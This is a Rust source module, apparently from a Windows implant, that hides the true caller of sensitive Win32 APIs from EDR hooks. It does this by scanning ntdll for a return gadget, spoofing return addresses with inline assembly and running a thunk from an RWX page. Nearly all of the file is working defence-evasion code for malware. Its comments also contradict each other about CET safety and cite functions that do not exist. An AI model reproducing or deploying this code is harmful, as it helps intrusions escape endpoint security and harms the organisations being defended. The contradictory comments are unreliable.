//! Caller-audit bypass — conceals the true caller of sensitive Win32 APIs
//! (`AddVectoredExceptionHandler`, `SetThreadContext`, etc.) from EDR inline
//! hooks that inspect the return address on the stack (caller-audit).
//!
//! # Technique: Return-Address Spoofing (DoomSyscalls pattern)
//!
//! EDR hooks intercept calls like `AddVectoredExceptionHandler` and read the
//! return address from `[RSP]` to determine WHO called it. If the return
//! address is in implant memory (RWX pages, unbacked regions), the EDR flags
//! it as "anomalous dynamic API call from unknown code."
//!
//! Countermeasure: before the call, push a fake return address that points
//! into ntdll's `.text` — specifically, an `ADD RSP, imm8; RET` sequence
//! (`48 83 C4 XX C3`) found in a legitimate ntdll export. The EDR sees the
//! caller as `ntdll!RtlExitUserThread+0x37` and passes the audit.
//!
//! The fake return address is a "stub" — it cleans the stack (add rsp, N)
//! and returns, landing back at the original caller's code seamlessly.
//!
//! # Calling Convention
//! The `call_with_spoofed_return!` macro generates an inline `asm!` block
//! that:
//!   1. pushes the fake return address
//!   2. jumps (not calls) to the target function
//!   3. the target function RETs → fake return → ADD RSP,N → RET → real caller
//!
//! # CET Safety
//! This creates a shadow-stack mismatch: the hardware shadow stack records the
//! CALL return address, but we use JMP + fake push. The shadow stack sees
//! the JMP (no entry) and the target function's RET pops from the shadow
//! stack — entry from the previous CALL. Mismatch = #CP on CET hardware.
//!
//! **On CET-enabled processes, use `call_with_iret_frame!` instead**, which
//! uses `call` (not `jmp`) with a pre-arranged stack frame so the shadow
//! stack remains consistent.
//!
//! # Usage
//! ```text
//! // Non-CET: fake ADD RSP;RET return
//! let handle = caller_spoof::call_with_spoofed_return(
//!     addr_of_add_veh, st, 1, hwbp_veh_handler as usize,
//! );
//! ```

#![cfg(target_os = "windows")]

use core::ffi::c_void;

// ---- Public API -----------------------------------------------------------

/// A return-address stub found in ntdll's `.text` — an `ADD RSP, imm8; RET`
/// sequence that cleans the stack and returns.
#[derive(Debug, Clone, Copy)]
pub struct ReturnStub {
    /// Absolute address of the `ADD RSP, imm8` instruction in ntdll.
    pub addr: usize,
    /// The `imm8` value — how many bytes the stub pops from the stack.
    /// The caller must ensure the stack has this many bytes of slack above
    /// the return address.
    pub stack_clean: u8,
}

/// Scan ntdll's `.text` for an `ADD RSP, imm8; RET` sequence
/// (`48 83 C4 XX C3`). Returns the first match found.
///
/// The stub is used as a fake return address: when the called function RETs,
/// it lands at the stub which cleans the stack and RETs again to the real
/// caller.
///
/// # Safety
/// Must run after PEB-walk bootstrap (ntdll must be located).
pub unsafe fn scan_return_stub() -> Option<ReturnStub> {
    let ntdll_base = crate::resolve::module_base_by_name(b"ntdll.dll")?;
    scan_stub_in_module(ntdll_base)
}

/// Scan a specific module for a return-address stub. For modules other than
/// ntdll (e.g. kernelbase), the stub address appears as a different caller
/// in the same system DLL family.
///
/// # Safety
/// `module_base` must point to a valid, mapped PE image.
pub unsafe fn scan_stub_in_module(module_base: *mut u8) -> Option<ReturnStub> {
    let dos = &*(module_base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    // Read PE signature at e_lfanew, then FileHeader at sig+4.
    let pe_sig = *((module_base as usize + dos.e_lfanew as usize) as *const u32);
    if pe_sig != 0x00004550 {
        return None;
    }
    let file_hdr = &*((module_base as usize + dos.e_lfanew as usize + 4) as *const ImageFileHeader);

    // Correct section offset: e_lfanew + 4 (sig) + 20 (FILE_HEADER) + SizeOfOptionalHeader
    let section_off = dos.e_lfanew as usize + 4 + 20 + file_hdr.size_of_optional_header as usize;
    let sections = (module_base as usize + section_off) as *const ImageSectionHeader;

    for i in 0..file_hdr.number_of_sections as usize {
        let sec = &*sections.add(i);
        let name = core::slice::from_raw_parts(sec.name.as_ptr(), 8);
        if &name[..5] == b".text" {
            let va = sec.virtual_address as usize;
            let vs = sec.virtual_size as usize;
            let size = if vs > 0 {
                vs
            } else {
                sec.size_of_raw_data as usize
            };
            return scan_for_stub(module_base as usize + va, size, module_base as usize + va);
        }
    }
    None
}

/// Low-level: scan a byte range for `48 83 C4 XX C3` pattern.
/// Returns a match with a valid stub. Prefers `ADD RSP, X; RET` (clean + return),
/// falls back to a bare `RET` (C3) at a function boundary if no ADD pattern found.
unsafe fn scan_for_stub(
    region_base: usize,
    region_size: usize,
    mod_base: usize,
) -> Option<ReturnStub> {
    let bytes = core::slice::from_raw_parts(region_base as *const u8, region_size.min(0x100000));
    // Pattern 1: 48 83 C4 XX C3 (ADD RSP, imm8; RET) — preferred.
    // XX = imm8, multiples of 8, 0x08..=0x78.
    let mut i = 0;
    while i + 5 <= bytes.len() {
        if bytes[i] == 0x48 && bytes[i + 1] == 0x83 && bytes[i + 2] == 0xC4 && bytes[i + 4] == 0xC3
        {
            let imm = bytes[i + 3];
            if imm >= 8 && imm % 8 == 0 && imm < 0x80 {
                return Some(ReturnStub {
                    addr: mod_base + i,
                    stack_clean: imm,
                });
            }
        }
        i += 1;
    }
    // Pattern 2 (fallback): any C3 (RET) — treat as stack_clean=0.
    // The callee returns to this RET, which pops our after_call → back to us.
    for (j, &b) in bytes.iter().enumerate() {
        if b == 0xC3 {
            return Some(ReturnStub {
                addr: mod_base + j,
                stack_clean: 0,
            });
        }
    }
    None
}

/// Call a function with a spoofed return address on the stack, so EDR inline
/// hooks that inspect `[RSP]` see the caller as a legitimate ntdll address.
///
/// # Arguments
/// - `stub`: pre-scanned return-address stub in ntdll
/// - `target`: the function to call
/// - `arg1..arg4`: up to 4 arguments (the x64 max in registers)
///
/// # Safety
/// - `target` must be a valid function with the standard `extern "system"`
///   calling convention taking `usize` arguments.
/// - `stub.stack_clean` must match the actual stack layout (typically 0x20
///   for the 4-arg shadow space + optional extra args on stack).
/// - The target function MUST use `ret` (not `ret imm16`), since the stub
///   already handles stack cleanup.
///
/// # CET Compatibility
/// This uses `call` (not `jmp`) so the shadow stack records the real return
/// address. The target function's `ret` pops from both stacks. The stub's
/// `ret` also pops from both stacks. **Shadow-stack-compatible.**
pub unsafe fn call_with_spoofed_return_4(
    stub: ReturnStub,
    target: unsafe extern "system" fn(usize, usize, usize, usize) -> usize,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
) -> usize {
    let fake_ret = stub.addr;
    // adjust = stack_clean — the stub's `ADD RSP, stack_clean` pops these
    // bytes, then `RET` pops the `after_call` return point we pushed.
    let adjust: usize = stub.stack_clean as usize;
    let result: usize;

    // Stack (top→bottom) after jmp target:
    //   [RSP+0x00] = fake_ret      ← callee's RET pops
    //   [RSP+0x08] = adjust bytes  ← stub's ADD RSP pops
    //   [RSP+0x08+adjust] = 2f    ← stub's RET pops → back to our code
    //   ... saved regs + orig ret addr ...
    core::arch::asm!(
        "pushq %rbx",
        "pushq %rbp",
        "pushq %rdi",
        "pushq %rsi",
        "pushq %r12",
        "pushq %r13",
        "pushq %r14",
        "pushq %r15",
        "movq {a1}, %rcx",
        "movq {a2}, %rdx",
        "movq {a3}, %r8",
        "movq {a4}, %r9",
        "subq {adjust}, %rsp",
        "call 99f",
        "99:",
        "popq %rax",
        "addq $14, %rax",
        "pushq %rax",
        "push {fake_ret}",
        "movq {target}, %rax",
        "jmp *%rax",
        "98:",
        "addq {adjust}, %rsp",
        "popq %r15",
        "popq %r14",
        "popq %r13",
        "popq %r12",
        "popq %rsi",
        "popq %rdi",
        "popq %rbp",
        "popq %rbx",
        a1 = in(reg) a1,
        a2 = in(reg) a2,
        a3 = in(reg) a3,
        a4 = in(reg) a4,
        target = in(reg) target as usize,
        fake_ret = in(reg) fake_ret,
        adjust = in(reg) adjust,
        lateout("rax") result,
        options(att_syntax),
    );
    result
}

///
/// `AddVectoredExceptionHandler` takes 2 args: `First: u32` (1 = front of
/// chain, 0 = back) and `Handler: PVECTORED_EXCEPTION_HANDLER`.
/// The handler's signature is `extern "system" fn(*mut EXCEPTION_POINTERS) -> LONG`.
///
/// Returns the VEH handle (null on failure).
///
/// # Safety
/// `handler` must be a valid VEH handler function.
/// `stub` must point to a valid `ADD RSP, X; RET` in ntdll with
/// `stack_clean >= 8` (the 2 shadow args + return address = 0x10 minimum).
pub unsafe fn add_vectored_handler_spoofed(
    stub: ReturnStub,
    first: usize,
    handler: unsafe extern "system" fn(usize) -> i32,
) -> *mut c_void {
    // Build a raw-byte trampoline that calls AddVectoredExceptionHandler
    // with a spoofed return address (ntdll RET stub).
    let aveh = match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler"))
    {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };

    // Build the trampoline thunk.
    let thunk = crate::caller_spoof_thunk::build(
        stub.addr,        // ntdll RET stub (fake return address)
        aveh,             // AddVectoredExceptionHandler
        first,            // arg1: First (1 = front)
        handler as usize, // arg2: Handler fn ptr
        0,                // arg3: unused
        0,                // arg4: unused
    );

    // Allocate RWX page for the trampoline.
    let nt_alloc = match crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };
    type NtAlloc =
        unsafe extern "system" fn(usize, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
    let alloc: NtAlloc = core::mem::transmute(nt_alloc);
    let mut page: *mut c_void = core::ptr::null_mut();
    let mut sz: usize = 0x1000;
    let st = alloc(!0usize, &mut page, 0, &mut sz, 0x3000, 0x40); // RWX
    if st < 0 || page.is_null() {
        return core::ptr::null_mut();
    }

    // Copy thunk bytes.
    core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), page as *mut u8, thunk.len);

    // Execute the trampoline — returns the VEH handle in RAX.
    let thunk_fn: unsafe extern "system" fn() -> usize = core::mem::transmute(page);
    let handle = thunk_fn();

    // Free the page.
    let nt_free = match crate::resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory") {
        Some(a) => a,
        None => {
            return handle as *mut c_void;
        }
    };
    type NtFree = unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
    let free: NtFree = core::mem::transmute(nt_free);
    let mut fsz: usize = 0;
    free(!0usize, &mut page, &mut fsz, 0x8000);

    handle as *mut c_void
}

/// Generic wrapper: call any 2-arg `extern "system"` function with a spoofed
/// return address. Useful for one-off sleeper calls.
///
/// # Safety
/// Same as `call_with_spoofed_return_4` but with 2 meaningful args.
pub unsafe fn call_2arg_spoofed(
    stub: ReturnStub,
    target_addr: usize,
    a1: usize,
    a2: usize,
) -> usize {
    let target_fn: unsafe extern "system" fn(usize, usize, usize, usize) -> usize =
        core::mem::transmute(target_addr);
    call_with_spoofed_return_4(stub, target_fn, a1, a2, 0, 0)
}

// ---- PE header types (minimal, for section walk) --------------------------

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u16; 29],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    _machine: u16,
    number_of_sections: u16,
    _pad: [u32; 3],
    size_of_optional_header: u16,
    _characteristics: u16,
}

// NOTE: ImageNtHeaders64 is NOT used for section-offset calculation.
// The correct section offset is:
//   e_lfanew + 4 (signature) + 20 (FILE_HEADER) + size_of_optional_header
// Using struct size would be wrong because OptionalHeader varies by arch.

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    _pointer_to_raw_data: u32,
    _pad: [u32; 3],
    _characteristics: u32,
}

// ---- Selftest support -----------------------------------------------------

/// Self-test: scan for a return stub in ntdll and verify it's valid.
/// Returns `true` if a stub was found with a plausible address in ntdll.
pub fn selftest_stub() -> bool {
    unsafe { scan_return_stub().is_some() }
}
